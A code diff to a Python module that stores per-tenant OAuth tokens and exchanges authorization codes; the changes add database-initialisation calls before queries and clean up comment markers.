@@ -1,7 +1,7 @@
-from db import SessionLocal, init_db  # ✅ UPDATED
+from db import SessionLocal, init_db
 from models import TenantToken
 from datetime import datetime, timedelta
-from urllib.parse import urlencode, quote_plus, unquote  # ✅ UPDATED
+from urllib.parse import urlencode, quote_plus, unquote
 import requests
 import os
 import uuid
@@ -19,9 +19,11 @@ TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
 
 
 # =========================
-# TOKEN STORAGE (UPDATED WITH DEVICE INFO)
+# TOKEN STORAGE
 # =========================
 def save_token(user_id, session_id, token_data, device_info=None):
+    init_db()  # ✅ FIX: ensure table exists
+
     db = SessionLocal()
 
     expires_at = int(
@@ -60,6 +62,8 @@ def save_token(user_id, session_id, token_data, device_info=None):
 
 
 def get_token(user_id, session_id=None):
+    init_db()  # ✅ FIX: ensure table exists BEFORE query
+
     db = SessionLocal()
 
     query = db.query(TenantToken).filter_by(tenant_id=user_id)
@@ -108,13 +112,12 @@ def send_telegram_alert(message: str):
 
 
 # =========================
-# TOKEN EXCHANGE (FIXED)
+# TOKEN EXCHANGE
 # =========================
 def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_agent: str = None):
+    init_db()  # ✅ FIX: ensure table exists
 
-    init_db()  # ✅ FIX 1: ensure table exists
-
-    state = unquote(state)  # ✅ FIX 2: decode URL-encoded state
+    state = unquote(state)  # ✅ FIX: decode URL-encoded state
 
     if ":" in state:
         user_id, session_id = state.split(":")
